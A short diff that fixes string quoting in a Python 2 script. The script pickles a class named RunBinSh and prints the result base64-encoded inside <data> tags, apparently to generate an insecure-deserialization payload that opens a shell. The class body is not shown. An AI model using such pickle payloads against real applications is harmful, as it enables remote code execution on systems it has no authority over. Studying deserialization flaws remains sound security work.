@@ -48,7 +48,7 @@ class RunBinSh(object):
 
 def main():
     data = cPickle.dumps(RunBinSh())
-    print('<data> + base64.b64encode(data) + </data>')
+    print('<data>' + base64.b64encode(data) + '</data>')
 
 main()
 ```
